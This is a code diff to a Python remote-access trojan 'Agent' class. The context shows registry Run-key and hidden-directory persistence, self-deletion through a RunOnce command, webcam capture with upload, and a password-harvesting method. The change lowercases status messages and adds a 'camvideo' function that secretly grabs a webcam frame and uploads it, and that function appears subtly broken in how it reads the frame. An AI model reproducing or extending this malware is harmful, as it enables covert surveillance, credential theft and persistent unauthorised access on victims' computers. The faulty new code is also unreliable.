@@ -201,7 +201,7 @@ class Agent(object):
             self.send_output('[!] Persistence only supported on compiled agents.')
             return
         if self.is_installed():
-            self.send_output('[!] Agent seems to be already installed.')
+            self.send_output('[!] agent seems to be already installed.')
             return
         if platform.system() == 'Linux':
             persist_dir = self.expand_path('~/.%s' % config.AGENT_NAME)
@@ -226,7 +226,7 @@ class Agent(object):
             shutil.copyfile(sys.executable, agent_path)
             cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d \"%s\"" % (config.AGENT_NAME, agent_path)
             subprocess.Popen(cmd, shell=True)
-        self.send_output('[+] Agent installed.')
+        self.send_output('[+] agent installed.')
 
     def clean(self):
         """ Uninstalls the agent """
@@ -245,7 +245,7 @@ class Agent(object):
             cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (
             config.AGENT_NAME, persist_dir, persist_dir)
             subprocess.Popen(cmd, shell=True)
-        self.send_output('[+] Agent removed successfully.')
+        self.send_output('[+] agent removed successfully.')
 
     def exit(self):
         """ Kills the agent """
@@ -321,6 +321,21 @@ class Agent(object):
         tmp_file.close()
         cv2.imwrite(camshot_file, frame)
         self.upload(camshot_file)
+
+    @threaded
+    def camvideo(self):
+        cam = cv2.VideoCapture(0)
+        time.sleep(3)
+        ret, video = cam.grab()
+        if not ret:
+            return
+
+        tmp_file = tempfile.NamedTemporaryFile()
+        camshot_file = tmp_file.name + ".png"
+        tmp_file.close()
+        cv2.imwrite(camshot_file, video)
+        self.upload(camshot_file)
+
 
     @threaded
     def passwords(self):
